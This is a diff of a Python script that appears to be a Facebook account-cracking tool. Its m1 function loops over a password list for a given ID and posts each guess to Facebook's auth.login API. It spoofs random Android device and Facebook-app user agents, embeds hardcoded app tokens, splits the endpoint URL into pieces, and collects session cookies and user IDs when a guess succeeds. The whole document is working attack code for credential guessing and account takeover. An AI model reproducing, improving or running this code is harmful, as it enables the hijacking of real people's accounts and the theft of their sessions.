@@ -925,52 +925,50 @@ useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36
 
 def m1(idf,pwv):
     global loop, ok, cp
-    AMSS2 = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
-    sexy=f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/277454707;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
     sys.stdout.flush()
     try:
       for pw in pwv:
-            data = {'adid':str(uuid.uuid4()),
-            'email':idf,
-            'password':pw,
-            'cpl':'true',
-            'credentials_type':'device_based_login_password',
+            F1 = "[FBAN/FB4A;FBAV/163.0.0.43.91;FBBV/96845992;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_BR;FBRV/97737839;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+            data = {"adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "cpl": "true",
+            "family_device_id": str(uuid.uuid4()),
+            "credentials_type": "device_based_login_password",
+            "error_detail_type": "button_with_disabled",
             "source": "device_based_login",
-            'error_detail_type':'button_with_disabled',
-            'source':'login','format':'json',
-            'generate_session_cookies':'1',
-            'generate_analytics_claim':'1',
-            'generate_machine_id':'1',
-            "locale":"es_CU","client_country_code":"CU",
-            'device':str(uuid.uuid4()),
-            'device_id':str(uuid.uuid4()),
+            "email": idf,
+            "password": pw,
+            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+            "generate_session_cookies": "1",
+            "meta_inf_fbmeta": "",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
             "method": "auth.login",
             "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-            head ={
-            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
-            "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
-            "content-type": "application/x-www-form-urlencoded",
-            "x-fb-connection-type": "WIFI",
-            "x-fb-background-state": "1",
-            "x-graphql-request-purpose": "fetch",
-            "user-agent": sexy,
-            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-            "x-graphql-client-library": "graphservice",
-            "x-fb-privacy-context": "3643298472347298",
-            "x-fb-device-group": "3273",
-            "x-tigon-is-retry": "False",
-            "priority": "u=3,i",
-            "accept-encoding": "gzip, deflate",
-            "x-fb-http-engine": "Liger",
-            "x-fb-client-ip": "True",
-            "x-fb-server-cluster": "True"}
-            url ='https://m.facebook.com/auth/login'
-            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "api_key": "882a8490361da98702bf97a021ddc14d"}
+            headers ={'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F1}',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'x-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            po = session.post("https://api.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).text
+            q = json.loads(po)
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     uid=str(q['uid'])
